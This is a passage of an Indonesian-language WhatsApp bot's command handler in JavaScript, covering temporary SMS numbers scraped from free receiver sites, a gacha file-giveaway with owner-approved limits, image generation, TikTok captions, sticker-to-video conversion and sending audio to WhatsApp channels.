  const nomor = await getNumberFallback(text.toLowerCase()).catch(e => ({ error: e.message }));
  if (nomor.error) return m.reply(`❌ ${nomor.error}`);

  const session = {
    user,
    provider: nomor.provider || "scraper",
    country: text,
    number: nomor.number,
    full: nomor.full || nomor.number,
    age: nomor.age || "-",
    startAt: Date.now(),
    maxSec: 600,
    lastMessages: nomor.messages || [],
    msgKey: null
  };

  // simpan & kirim pesan utama
  const msgText =
    `📞 *Nomor Sementara (${session.country.toUpperCase()})*\n\n` +
    `📱 Nomor: +${session.full}\n` +
    `⏳ Umur nomor: ${session.age}\n` +
    `⏰ Waktu tersisa: ${formatTime(session.maxSec)}\n\n` +
    `💬 *Pesan Masuk:*\nBelum ada pesan yang masuk...`;

  const infoMsg = await Sky.sendMessage(m.chat, { text: msgText });
  session.msgKey = { remoteJid: m.chat, id: infoMsg.key.id, fromMe: true };

  // tombol kontrol (kirim terpisah)
  await Sky.sendMessage(m.chat, {
    text: "🎛️ Kontrol Sesi:",
    buttons: [
      { buttonId: ".stopnokos", buttonText: { displayText: "🛑 Stop" }, type: 1 },
      { buttonId: ".changenumber", buttonText: { displayText: "🆕 Change Number" }, type: 1 },
      { buttonId: ".changecountry", buttonText: { displayText: "🌍 Change Country" }, type: 1 },
      { buttonId: ".resettimer", buttonText: { displayText: "♻️ Reset Time" }, type: 1 }
    ],
    headerType: 1
  });

  // save session
  global.tempSessions[user] = session;
  sessions[user] = session;
  save(sessions);

  // Interval: cek pesan & update countdown setiap 3 detik
  session.interval = setInterval(async () => {
    const s = global.tempSessions[user];
    if (!s) return;
    const elapsed = Math.floor((Date.now() - s.startAt) / 1000);
    const remain = Math.max(0, s.maxSec - elapsed);

    // Ambil pesan
    const msgs = await (async () => {
      if (s.provider === "luban") return await getMessagesLuban(s.country, s.number);
      return await getMessagesGeneric(s);
    })().catch(() => []);

    let formatted = "Belum ada pesan yang masuk...";
    if (msgs && msgs.length) {
      formatted = msgs.map((x, i) => `📩 *${i + 1}.* Dari: ${x.from}\n🕒 ${x.time}\n💬 ${x.text}`).join("\n\n");
    }

    const textUpdate =
      `📞 *Nomor Sementara (${s.country.toUpperCase()})*\n\n` +
      `📱 Nomor: +${s.full}\n` +
      `⏳ Umur nomor: ${s.age}\n` +
      `⏰ Waktu tersisa: ${formatTime(remain)}\n\n` +
      `💬 *Pesan Masuk:*\n${formatted}`;

    try {
      await Sky.sendMessage(m.chat, { edit: s.msgKey, text: textUpdate });
    } catch {
      // fallback: kirim pesan baru (jika edit gagal)
      await Sky.sendMessage(m.chat, { text: textUpdate });
    }

    // reaksi bila pesan baru
    if ((msgs || []).length > (s.lastMessages || []).length) {
      await Sky.sendMessage(m.chat, { react: { text: "💬", key: m.key } });
      s.lastMessages = msgs;
    }

    if (remain <= 0) {
      clearInterval(s.interval);
      delete global.tempSessions[user];
      delete sessions[user];
      save(sessions);
      await m.reply(`⏹️ Waktu 10 menit habis. Nomor +${s.full} ditutup.`);
    } else {
      // simpan sesi tiap tick
      sessions[user] = s;
      save(sessions);
    }
  }, 3000);
}
break;

// =====================
// Tombol handler: stop / change / reset / change country tombol list
// =====================
case "stopnokos":
case "changenumber":
case "changecountry":
case "resettimer": {
  if (m.isGroup) return Reply(mess.private);

  const fs = require("fs");
  const path = require("path");
  const axios = require("axios");
  const cheerio = require("cheerio");

  const filePath = path.join(process.cwd(), "library/database/sampah/sessions.json");
  if (!fs.existsSync(filePath)) return m.reply("⚠️ Tidak ada sesi aktif.");
  const sessions = JSON.parse(fs.readFileSync(filePath, "utf8") || "{}");
  const user = m.sender;
  const s = sessions[user];
  if (!s) return m.reply("⚠️ Tidak ada sesi aktif.");

  // re-declare helper (agar tidak undefined)
  const defaultHeaders = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  };

  const getNumberLuban = async (country) => {
    const res = await axios.get(`https://lubansms.com/v2/api/freeNumbers?countries=${country}`, { headers: defaultHeaders, timeout: 15000 });
    const aktif = Array.isArray(res.data?.msg) ? res.data.msg.filter(n => !n.is_archive) : [];
    if (!aktif.length) throw new Error("no number");
    const x = aktif[0];
    return { provider: "luban", number: x.number, full: x.full_number, age: x.data_humans || "-" };
  };

  const scrapeReceiveSmss = async (country) => {
    const url = `https://receive-smss.com/country/${encodeURIComponent(country)}`;
    const res = await axios.get(url, { headers: defaultHeaders, timeout: 15000 });
    const $ = cheerio.load(res.data);
    const first = $("a.number").first();
    const href = first.attr("href") || "";
    const absolute = href ? new URL(href, url).href : null;
    if (!absolute) throw new Error("no number");
    const detail = await axios.get(absolute, { headers: defaultHeaders, timeout: 15000 });
    const $$ = cheerio.load(detail.data);
    const num = $$("h1, .phone, .number").first().text().trim().replace(/\D/g, "");
    if (!num) throw new Error("no number");
    return { provider: "receive-smss", number: num, full: num, age: "?" };
  };

  const getNumberFallback = async (country) => {
    try { return await getNumberLuban(country); } catch {}
    try { return await scrapeReceiveSmss(country); } catch {}
    throw new Error("no provider");
  };

  switch (command) {
    case "stopnokos":
      clearInterval(global.tempSessions?.[user]?.interval);
      delete global.tempSessions[user];
      delete sessions[user];
      fs.writeFileSync(filePath, JSON.stringify(sessions, null, 2));
      return m.reply("🛑 Sesi dihentikan.");

    case "changenumber": {
      try {
        const alt = await getNumberFallback(s.country);
        s.provider = alt.provider; s.number = alt.number; s.full = alt.full; s.age = alt.age || s.age;
        s.startAt = Date.now();
        sessions[user] = s;
        fs.writeFileSync(filePath, JSON.stringify(sessions, null, 2));
        return m.reply(`✅ Nomor berhasil diganti!\n📱 +${s.full}\n⏳ Umur: ${s.age}`);
      } catch (e) {
        return m.reply("❌ Gagal mengganti nomor: " + e.message);
      }
    }

    case "changecountry": {
      // ambil list negara dari Luban, tampilkan sebagai pesan supaya user klik/ketik
      try {
        const { data } = await axios.get("https://lubansms.com/v2/api/freeCountries", { headers: defaultHeaders, timeout: 15000 });
        const list = (data.msg || []).filter(c => c.online).map((c, i) => `🌍 ${i + 1}. ${c.name}`).join("\n");
        // hentikan sesi sekarang
        clearInterval(global.tempSessions?.[user]?.interval);
        delete global.tempSessions[user];
        delete sessions[user];
        fs.writeFileSync(filePath, JSON.stringify(sessions, null, 2));
        // kirim list dan petunjuk
        return m.reply(`🌍 *Pilih negara baru (klik/ketik nama negara):*\n\n${list}\n\n📌 Contoh: .nokos france`);
      } catch (e) {
        return m.reply("❌ Gagal ambil daftar negara dari Luban.");
      }
    }

    case "resettimer":
      s.startAt = Date.now();
      sessions[user] = s;
      fs.writeFileSync(filePath, JSON.stringify(sessions, null, 2));
      return m.reply("♻️ Timer direset ke 10 menit.");
  }
}
break;

// =========================
    // GACHA
    // =========================
    case 'gacha':
    case 'gachasc':
    case 'gachamt': {
        const sender = m.sender
        const data = loadLimitData()
        const userData = data.find(u => u.user === sender) || { user: sender, limit: 5, gacha: 0, hasil: [], poin: 0 }

        if (userData.limit <= 0) {
            const teks = `🚫 *Limit Gacha Kamu Sudah Habis!*\n\nKamu bisa minta tambahan limit dengan cara:\n> .mintalimit <tingkatan>\n\n📎 Contoh:\n.mintalimit Langka (sambil reply script bot yang mau dikasih)`
            return Sky.sendMessage(m.chat, { text: teks }, { quoted: m })
        }

        await Sky.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

        let folderId, jenis
        if (command === 'gacha' || command === 'gachamt') {
            folderId = '1D-0EV7718184dZkzZc8ag5DXSM_hePDN'
            jenis = 'Mentahan Teks'
        } else {
            folderId = '1zgbo3hUW0nxMqkK0rHcuhNwlIE5Q8Z_1'
            jenis = 'Script Bot'
        }

        const files = await getDriveFiles(folderId)
        if (!files.length) return m.reply('⚠️ Tidak ditemukan file gacha di folder Google Drive.')

        const random = files[Math.floor(Math.random() * files.length)]
        const tingkat = /\[([^\]]+)\]/.exec(random.name)
        const rarity = tingkat ? tingkat[1] : 'Biasa'
        const rarityPoint = { 'Biasa': 1, 'Langka': 3, 'Super Langka': 5, 'Rare': 3 }
        const poin = rarityPoint[rarity] || 1

        userData.limit -= 1
        userData.gacha += 1
        userData.poin += poin
        userData.hasil.push({ nama: random.name, tingkat: rarity })

        const idx = data.findIndex(u => u.user === sender)
        if (idx >= 0) data[idx] = userData
        else data.push(userData)
        saveLimitData(data)

        await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } })

const info = `🎲 *GACHA ${jenis} BERHASIL!*\n\n📁 Nama: ${random.name}\n⭐ Tingkat: ${rarity}\n🎯 Poin: +${poin}\n💰 Total Poin: ${userData.poin}\n🎲 Total Gacha: ${userData.gacha}\n🔁 Sisa Limit: ${userData.limit}/5`

await Sky.sendMessage(m.chat, {  
    document: { url: random.url },  
    fileName: random.name,  
    mimetype: random.name.endsWith('.zip') ? 'application/zip' : 'text/plain',
    caption: info
}, { quoted: m })
		
    } break

    // =========================
    // MINTALIMIT
    // =========================
    case 'mintalimit': {
        if (!text) return m.reply('⚠️ Gunakan: .mintalimit <tingkatan>\n\nContoh:\n.mintalimit Langka (reply script bot kamu)')

        if (!m.quoted || !m.quoted.message?.documentMessage)
            return m.reply('📎 Kamu harus reply file script bot yang mau dikasih!')

        const doc = m.quoted.message.documentMessage
        const reqInfo = `📨 *Permintaan Tambah Limit*\n\n👤 Pengguna: @${m.sender.split('@')[0]}\n📈 Tingkatan: ${text}\n📎 File: ${doc.fileName}\n\nPilih tindakan di bawah ini:`
        const interactiveButtons = [
            {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                    display_text: "✅ Setujui Limit",
                    id: `.approvelimit ${m.sender}`
                })
            },
            {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                    display_text: "❌ Tolak Permintaan",
                    id: `.rejectlimit ${m.sender}`
                })
            }
        ]
        const msg = { title: reqInfo, footer: "📬 Sistem Permintaan Limit", interactiveButtons }
        Sky.sendMessage(global.owner + '@s.whatsapp.net', msg, { quoted: m })
        Sky.sendMessage(m.chat, { text: "✅ Permintaan limit telah dikirim ke owner, tunggu konfirmasi ya!" }, { quoted: m })
    } break

    // =========================
    // APPROVE LIMIT
    // =========================
    case 'approvelimit': {
        if (!isOwner) return
        const target = args[0]
        if (!target) return m.reply('⚠️ Contoh: .approvelimit 628xxxx@s.whatsapp.net')

        const data = loadLimitData()
        const user = data.find(u => u.user === target) || { user: target, limit: 5, gacha: 0, hasil: [], poin: 0 }
        user.limit += 5
        const idx = data.findIndex(u => u.user === target)
        if (idx >= 0) data[idx] = user
        else data.push(user)
        saveLimitData(data)

        Sky.sendMessage(target, { text: `✅ Permintaan limit kamu telah disetujui oleh Owner!\n📦 Tambahan: +5 limit.` })
        Sky.sendMessage(m.chat, { text: `✅ Limit user ${target} berhasil ditambah 5.` })
    } break

    // =========================
    // REJECT LIMIT
    // =========================
    case 'rejectlimit': {
        if (!isOwner) return
        const target = args[0]
        if (!target) return m.reply('⚠️ Contoh: .rejectlimit 628xxxx@s.whatsapp.net')

        Sky.sendMessage(target, { text: `❌ Permintaan limit kamu *ditolak* oleh Owner.\n\nSilakan coba lagi nanti atau kirim ulang permintaan dengan alasan yang lebih jelas.` })
        Sky.sendMessage(m.chat, { text: `❌ Permintaan limit dari ${target} telah ditolak.` })
    } break

    // =========================
    // ADD LIMIT
    // =========================
    case 'addlimit': {
        if (!isOwner) return
        const nomor = args[0]
        const jumlah = parseInt(args[1])
        if (!nomor || isNaN(jumlah)) return m.reply('⚙️ Gunakan: .addlimit <nomor> <jumlah>\n\nContoh:\n.addlimit +62882019531122 10')

        await Sky.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

        let target = nomor.replace(/[^0-9]/g, '')
        if (target.startsWith('0')) target = '62' + target.slice(1)
        if (!target.endsWith('@s.whatsapp.net')) target = target + '@s.whatsapp.net'

        const data = loadLimitData()
        const user = data.find(u => u.user === target) || { user: target, limit: 5, gacha: 0, hasil: [], poin: 0 }
        user.limit += jumlah
        const idx = data.findIndex(u => u.user === target)
        if (idx >= 0) data[idx] = user
        else data.push(user)
        saveLimitData(data)

        await Sky.sendMessage(target, { text: `🎁 Kamu mendapatkan tambahan *${jumlah} limit* dari Owner!` })
        await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        Sky.sendMessage(m.chat, { text: `✅ Berhasil menambah *${jumlah} limit* untuk ${target}` })
    } break

    // =========================
    // TOP GACHA
    // =========================
    case 'topgacha': {
        const data = loadLimitData()
        if (!data.length) return m.reply('⚠️ Belum ada data gacha.')

        const rank = data.sort((a,b) => b.poin - a.poin).slice(0,10)
        let teks = '🏆 *TOP GACHA LEADERBOARD*\n\n'
        rank.forEach((x,i) => {
            teks += `${i+1}. @${x.user.split('@')[0]}\n🎯 Poin: ${x.poin}\n🎲 Gacha: ${x.gacha}\n\n`
        })
        Sky.sendMessage(m.chat, { text: teks, mentions: rank.map(x => x.user) }, { quoted: m })
    } break

    // =========================
    // MY GACHA
    // =========================
    case 'mygacha': {
        const data = loadLimitData()
        const user = data.find(u => u.user === m.sender)
        if (!user) return m.reply('Kamu belum pernah melakukan gacha.')

        let hasilText = user.hasil.map((h,i) => `(${i+1}) ${h.nama} - ${h.tingkat}`).join('\n')
        if (!hasilText) hasilText = '_Belum ada hasil gacha_'

        const teks = `👤 *Profil Gacha Kamu*\n\n🎯 Total Poin: ${user.poin}\n🎲 Total Gacha: ${user.gacha}\n🔁 Sisa Limit: ${user.limit}/5\n\n📦 *Riwayat Gacha:*\n${hasilText}`
        Sky.sendMessage(m.chat, { text: teks }, { quoted: m })
    } break
    
//=======================================================
    
case "nokia" :
case "nqc" : {
const { createCanvas, loadImage } = require("canvas");
  const fs = require("fs");
  const path = require("path");
  const fetch = require("node-fetch");

  if (!text) return m.reply(example("Kirim teks yang ingin ditampilkan di layar Nokia."));

  await Sky.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });

  try {
    const backgroundUrl = "https://img1.pixhost.to/images/9688/655065232_rafzbot.jpg";
    const res = await fetch(backgroundUrl);
    const bufferBg = await res.buffer();
    const bg = await loadImage(bufferBg);

    const canvas = createCanvas(bg.width, bg.height);
    const ctx = canvas.getContext("2d");
    ctx.drawImage(bg, 0, 0, bg.width, bg.height);

    // ROTASI: +15 DERAJAT (0.26 radian) - Sudah Benar
    ctx.save();
    ctx.translate(bg.width / 2, bg.height / 2);
    ctx.rotate(0.26); // +0.26 rad ≈ +15 derajat (Mengarah ke kanan bawah)
    ctx.translate(-bg.width / 2, -bg.height / 2);

    // Atur font
    // --- PENYESUAIAN UKURAN FONT (Dinaikkan dari 0.055 ke 0.060) ---
    const fontSize = Math.round(bg.width * 0.078); 
    ctx.font = `bold ${fontSize}px Arial`;
    // --- PENYESUAIAN WARNA FONT (Abu-abu gelap untuk kesan natural) ---
    ctx.fillStyle = "#333333"; // Warna abu-abu gelap, lebih natural dari hitam pekat
    ctx.textBaseline = "top";

    // Posisi Teks (sudah dikalibrasi dengan baik)
    const boxX = bg.width * 0.23; 
    const boxY = bg.height * 0.33; 
    const boxWidth = bg.width * 0.65; 
    
    const lineHeight = fontSize * 1.2;
    const maxLines = 9;

    // Fungsi bungkus teks (Tidak Berubah)
    function wrapText(ctx, text, x, y, maxWidth, lineHeight, maxLines) {
      const words = text.split(" ");
      let line = "";
      let lines = [];
      for (let n = 0; n < words.length; n++) {
        const testLine = line + (line ? " " : "") + words[n];
        const metrics = ctx.measureText(testLine);
        if (metrics.width > maxWidth && n > 0) {
          lines.push(line);
          line = words[n];
          if (lines.length === maxLines) break;
        } else {
          line = testLine;
        }
      }
      if (lines.length < maxLines) lines.push(line);
      for (let i = 0; i < lines.length; i++) {
        ctx.fillText(lines[i], x, y + i * lineHeight);
      }
    }

    // Tulis teks utama
    wrapText(ctx, text, boxX, boxY, boxWidth, lineHeight, maxLines);

    // Hapus rotasi
    ctx.restore();

    // Simpan & kirim hasil
    const out = path.join(__dirname, `library/database/sampah/${m.sender}.jpg`);
    const buffer = canvas.toBuffer("image/jpeg");
    fs.writeFileSync(out, buffer);

    await Sky.sendMessage(
      m.chat,
      { image: { url: out }, caption: "*Nokia Quoted Message*" },
      { quoted: m }
    );

    fs.unlinkSync(out);
    await Sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

  } catch (e) {
    console.error(e);
    await Sky.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    m.reply("Terjadi kesalahan saat membuat gambar Nokia!");
  }
}
break
    
//=======================================================
    
case "ttcapt": 
case "ttcaption":
case "tiktokcaption": 
case "ttc" : {
    if (!text) return m.reply(`Example: ${prefix + command} [TikTok Link]`);

        await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let apiUrl = `https://api.rafzhost.xyz/api/downloader/tiktok?url=${encodeURIComponent(text)}`;
        let api = await fetch(apiUrl);
        let data = await api.json();
        if (!data.status) return m.reply('❌ Gagal mengambil caption coba lagi nanti atau hubungi owner')
const videoTitle = data.title;
const interactiveButtons = [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Salin Caption",
id: videoTitle,
copy_code: videoTitle
})
}
]

const interactiveMessage = {
text: `Caption: ${videoTitle}\n\n`,
title: `*Tiktok Caption dari Video: ${text}*\n\n`,
footer: "TikTok caption taker using Rafzhost API🔥 (api.rafzhost.xyz)",
interactiveButtons
}
await Sky.sendMessage(m.chat, interactiveMessage, {quoted:m})
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break
 
    
//=======================================================
    
case "addadder": case "adder": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi Adder bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/adder.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah Adder ✅`)
}
break

    
//=======================================================
    
/**
* Create By Fjr (Rebot)
* Fitur WEBP TO MP4 (Sticker to Mp4) - ESM (Type Case Fitur)
* Using ImageMagick and FFmpeg
* Pastikan server atau bot kalian sudah menginstall ImageMagick dan FFmpeg
* Jika versi ImageMagick kalian di atas versi 7, silahkan edit bagian execPromise(`convert "${inputPath}" "${tempPattern}"`); menjadi execPromise(`magick "${inputPath}" "${tempPattern}"`); 
* convert (versi 6) => magick (vesi 7)
* minus penggunaan berat akibat Extracted frames, bisa memakan sekitar 50% - 100% CPU tergantung banyak frames webp
*/

case 'tovideotest':
case 'tomp4test': {
const ffmpeg = require("fluent-ffmpeg");
const { exec } = require("child_process");
const { promisify } = require("util");
const fs = require("fs");
const path = require("path");
const execPromise = promisify(exec);

async function webpToMp4ImageMagick(inputPath, outputPath, options = {}) {
  try {
    const {
      duration = 3,
      fps = 15,
      quality = "medium"
    } = options;

    const tempDir = path.join(process.cwd(), './library/database/sampah');
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir);
    }

    const tempPattern = path.join(tempDir, `frame_%03d.png`);
    const tempVideo = path.join(tempDir, `temp_${Date.now()}.mp4`);

    // Extract frames using ImageMagick
    await execPromise(`convert "${inputPath}" "${tempPattern}"`);

    // Check if frames were extracted
    const frames = fs.readdirSync(tempDir).filter(file => file.startsWith('frame_'));
    
    if (frames.length === 0) {
      throw new Error('No frames extracted from webp');
    }

    console.log(`Extracted ${frames.length} frames`);

    // Convert frames to mp4 using FFmpeg
    const framerate = frames.length > 1 ? fps : `1/${duration}`;
    
    await execPromise(`ffmpeg -y -framerate ${framerate} -i "${tempPattern}" -c:v libx264 -pix_fmt yuv420p -vf "scale=512:512" "${outputPath}"`);

    // Cleanup temp files
    frames.forEach(frame => {
      fs.unlinkSync(path.join(tempDir, frame));
    });

    return outputPath;

  } catch (error) {
    throw new Error(`ImageMagick conversion failed: ${error.message}`);
  }
}

  if (!/image/.test(mime)) return m.reply(' ❔ Reply sticker yang mau diconvert ke video!');
  
  m.reply('🕒 Converting sticker to video... Please wait...');
  
  try {
    // Download sticker
    console.log('Downloading sticker...');
    const stickerBuffer = await Sky.downloadAndSaveMediaMessage(qmsg);
    
    if (!stickerBuffer) {
      throw new Error('Failed to download sticker');
    }
    
    // Generate temp file paths
    const inputFile = `./library/database/sampah/input_${getRandom('.webp')}`;
    const outputFile = `./library/database/sampah/output_${getRandom('.mp4')}`;
    
    // Ensure temp directory exists
    if (!fs.existsSync('./library/database/sampah')) {
      fs.mkdirSync('./library/database/sampah');
    }
    
    // Write sticker buffer to file
    fs.writeFileSync(inputFile, stickerBuffer);
    
    // Conversion options
    const conversionOptions = {
      duration: 3,        // 3 seconds for static stickers
      fps: 15,           // 15 FPS
      quality: 'medium', // Balance between quality and size
      scale: '512:512'   // WhatsApp recommended size
    };
    
    console.log('Starting conversion...');
    
    // Convert webp to mp4
    await webpToMp4ImageMagick(inputFile, outputFile, conversionOptions);
    
    // Check if output file exists and has content
    if (!fs.existsSync(outputFile) || fs.statSync(outputFile).size === 0) {
      throw new Error('Conversion failed - output file is empty or missing');
    }
    
    const fileSize = fs.statSync(outputFile).size;
    const fileSizeMB = (fileSize / (1024 * 1024)).toFixed(2);
    
    console.log(`Conversion completed. File size: ${fileSizeMB}MB`);
    
    // Check file size limit (WhatsApp has ~16MB limit for videos)
    if (fileSize > 15 * 1024 * 1024) { // 15MB limit
      throw new Error(`File too large (${fileSizeMB}MB). Try with a smaller sticker.`);
    }
    
    // Send the video
    await Sky.sendMessage(m.chat, {
      video: fs.readFileSync(outputFile),
      caption: `✅*Sticker to Video*\n\n🗂️**File Size:** ${fileSizeMB}MB\🕒 **Duration:** ${conversionOptions.duration}s\n🎬**FPS:** ${conversionOptions.fps}\n📐**Resolution:** 512x512\n\n*Converted by rafzboz`
    }, { quoted: m });
    
    // Cleanup temp files
    try {
      if (fs.existsSync(inputFile)) fs.unlinkSync(inputFile);
      if (fs.existsSync(outputFile)) fs.unlinkSync(outputFile);
    } catch (cleanupError) {
      console.log('Cleanup error:', cleanupError.message);
    }
    
  } catch (error) {
    console.log('tovideo Error:', error.message);
    
    let errorMsg = '❌ Gagal convert sticker ke video.\n\n';
    
    if (error.message.includes('FFmpeg')) {
      errorMsg += '🔧 **Masalah:** FFmpeg error\n💡 **Solusi:** Coba dengan sticker yang lain';
    } else if (error.message.includes('too large')) {
      errorMsg += '📊 **Masalah:** File terlalu besar\n💡 **Solusi:** Gunakan sticker yang lebih kecil';
    } else if (error.message.includes('download')) {
      errorMsg += '📥 **Masalah:** Gagal download sticker\n💡 **Solusi:** Pastikan reply sticker yang valid';
    } else {
      errorMsg += '💡 **Solusi:** Coba lagi atau gunakan sticker lain';
    }
    
    m.reply(errorMsg);
    
  } finally {
    
    // Cleanup any remaining temp files
    try {
      const tempDir = './library/database/sampah';
      if (fs.existsSync(tempDir)) {
        const tempFiles = fs.readdirSync(tempDir)
        .filter(file => file.includes(m.sender.split('@')[0]) || 
                          (Date.now() - fs.statSync(path.join(tempDir, file)).mtime.getTime() > 300000)); // 5 minutes old
        
        tempFiles.forEach(file => {
          try {
            fs.unlinkSync(path.join(tempDir, file));
          } catch (e) {
            // Ignore cleanup errors
          }
        });
      }
    } catch (e) {
      // Ignore cleanup errors
    }
  }
}
break;

//=======================================================

case 'sendchannel': {
  const fs = require('fs')
  const path = require('path')
  const ffmpeg = require('fluent-ffmpeg')

  const qmsg = m.quoted

  // 🔥 HELPER DETEKSI AUDIO (FINAL)
  function isAudioQuoted(msg) {
    if (!msg) return false

    const m = msg.message || msg.msg || {}

    if (m.audioMessage) return true
    if (m.voiceMessage) return true

    if (m.documentMessage) {
      const mime = m.documentMessage.mimetype || ''
      const name = m.documentMessage.fileName || ''
      if (mime.startsWith('audio/')) return true
      if (/\.(mp3|ogg|wav|m4a|opus)$/i.test(name)) return true
    }

    return false
  }

  if (!qmsg) {
    return m.reply(
      'Reply audio banh\n\n' +
      'Usage:\n' +
      '.sendchannel <id / link channel> <kualitas>\n\n' +
      'Kualitas:\n' +
      '- jelek (64k)\n' +
      '- sedang (128k)\n' +
      '- superhigh (256k)'
    )
  }

  if (!text) {
    return m.reply(
      'Masukin ID atau link channel banh\n\n' +
      'Contoh:\n' +
      '.sendchannel 120363xxxx@newsletter\n' +
      '.sendchannel https://whatsapp.com/channel/xxxx sedang'
    )
  }

  if (!isAudioQuoted(qmsg)) {
    return m.reply('Reply audio / VN / file audio (mp3, ogg, m4a)')
  }

  // =========================
  // PARSE INPUT
  // =========================
  const parts = text.trim().split(/\s+/)
  let channelInput = parts[0]
  const quality = (parts[1] || 'sedang').toLowerCase()

  let channelId = channelInput

  // 🔥 RESOLVE LINK → ID ASLI
  if (channelInput.includes('https://whatsapp.com/channel/')) {
    const invite = channelInput.split('https://whatsapp.com/channel/')[1]
    if (!invite) return m.reply('Link channel ga valid')

    let meta
    try {
      meta = await Sky.newsletterMetadata('invite', invite)
    } catch {
      return m.reply('Gagal ambil data channel')
    }

    channelId = meta.id
  }

  // VALIDASI ID CHANNEL
  if (!/^120\d+@newsletter$/.test(channelId)) {
    return m.reply(
      'ID channel tidak valid ❌\n\n' +
      'Gunakan:\n' +
      '- ID channel asli (120363xxxx@newsletter)\n' +
      '- atau link channel WhatsApp'
    )
  }

  // =========================
  // MAPPING KUALITAS
  // =========================
  let bitrate
  if (quality === 'jelek') bitrate = '64k'
  else if (quality === 'superhigh') bitrate = '256k'
  else bitrate = '128k'

  // =========================
  // DOWNLOAD AUDIO
  // =========================
  const buffer = await qmsg.download()

  const inFile = path.join(__dirname, `in_${Date.now()}`)
  const outFile = path.join(__dirname, `out_${Date.now()}.ogg`)
  fs.writeFileSync(inFile, buffer)

  // =========================
  // CONVERT → VN (OGG OPUS)
  // =========================
  try {
    await new Promise((resolve, reject) => {
      ffmpeg(inFile)
        .audioCodec('libopus')
        .audioChannels(1)
        .audioFrequency(48000)
        .audioBitrate(bitrate)
        .format('ogg')
        .on('end', resolve)
        .on('error', reject)
        .save(outFile)
    })
  } catch {
    fs.unlinkSync(inFile)
    return m.reply('Gagal convert audio')
  }

  const vnBuffer = fs.readFileSync(outFile)

  // =========================
  // KIRIM KE CHANNEL (REAL ID)
  // =========================
  try {
    await Sky.sendMessage(channelId, {
      audio: vnBuffer,
      mimetype: 'audio/ogg; codecs=opus',
      ptt: true
    })
  } catch {
    fs.unlinkSync(inFile)
    fs.unlinkSync(outFile)
    return m.reply(
      'Gagal kirim ke channel\n' +
      '- Bot bukan admin\n' +
      '- Bot belum join\n' +
      '- Atau channel dibatasi'
    )
  }

  fs.unlinkSync(inFile)
  fs.unlinkSync(outFile)

  m.reply(
    'Done VN terkirim ✅\n\n' +
    `Channel: ${channelId}\n` +
    `Kualitas: ${quality} (${bitrate})`
  )
}
break

//=======================================================
case 'playch': {
 if (!isOwner) return Reply(mess.owner)

  if (!text) return m.reply(
`🎧 PLAYCH GUIDE

.playch judul|channel|kualitas

Contoh:
.playch lily alan walker|12036xxx@newsletter
.playch monokrom|linkchannel|superhigh

Kualitas:
• jelek = 64k
• sedang = 128k (default)
• superhigh = 256k`
  )

  try {
    const fs = require('fs')
    const path = require('path')
    const ffmpeg = require('fluent-ffmpeg')
    const axios = require('axios')
    const yts = require('yt-search')

    const react = async (emo) => {
      await Sky.sendMessage(m.chat, { 
        react: { text: emo, key: m.key }
      })
      await new Promise(r => setTimeout(r, 1000))
    }

    await react('🕒')

    let [query, channelInput, quality] = text.split('|')

    if (!query || !channelInput) {
      await react('❌')
      return m.reply(`❌ Format salah\n\n.playch judul|channel|kualitas`)
    }

    quality = (quality || 'sedang').toLowerCase()

    await react('🌐')

    let channelId = channelInput.trim()

    if (channelId.includes('https://whatsapp.com/channel/')) {
      try {
        const invite = channelId.split('https://whatsapp.com/channel/')[1]
        let meta = await Sky.newsletterMetadata('invite', invite)
        channelId = meta.id
      } catch {
        await react('❌')
        return m.reply('❌ Gagal resolve link channel')
      }
    }

    if (!/^120\d+@newsletter$/.test(channelId)) {
      await react('❌')
      return m.reply('❌ ID channel tidak valid')
    }

    let bitrate =
      quality === 'jelek' ? '64k' :
      quality === 'superhigh' ? '256k' : '128k'

    await react('🔎')

    const search = await yts(query)

    if (!search.videos.length) {
      await react('❔')
      return m.reply('❌ Lagu tidak di temukan')
    }

    const vid = search.videos[0]

    await react('🌐')

    const headers = {
      accept: "application/json",
      "content-type": "application/json",
      "user-agent": "Mozilla/5.0",
      referer: "https://ytmp3.gg/"
    }

    const payload = {
      url: vid.url,
      os: "android",
      output: { type: "audio", format: "mp3" },
      audio: { bitrate: "128k" }
    }

    const req = async (u) =>
      axios.post(`https://${u}.ytconvert.org/api/download`, payload, { headers })

    const { data } = await req("hub").catch(() => req("api"))

    let result

    while (true) {
      const poll = await axios.get(data.statusUrl, { headers })

      if (poll.data.status === "completed") {
        result = poll.data
        break
      }

      if (poll.data.status === "failed") {
        await react('❌')
        return m.reply('❌ Convert gagal')
      }

      await new Promise(r => setTimeout(r, 1500))
    }

    await react('⬇️')

    const audioRes = await axios.get(result.downloadUrl, {
      responseType: 'arraybuffer'
    })

    const inFile = path.join(__dirname, `in_${Date.now()}`)
    const outFile = path.join(__dirname, `out_${Date.now()}.ogg`)

    fs.writeFileSync(inFile, audioRes.data)

    await react('🎧')

    await new Promise((resolve, reject) => {
      ffmpeg(inFile)
        .audioCodec('libopus')
        .audioChannels(1)
        .audioFrequency(48000)
        .audioBitrate(bitrate)
        .format('ogg')
        .on('end', resolve)
        .on('error', reject)
        .save(outFile)
    })

    const vnBuffer = fs.readFileSync(outFile)

    await react('📤')

    await Sky.sendMessage(channelId, {
      audio: vnBuffer,
      mimetype: 'audio/ogg; codecs=opus',
      ptt: true,
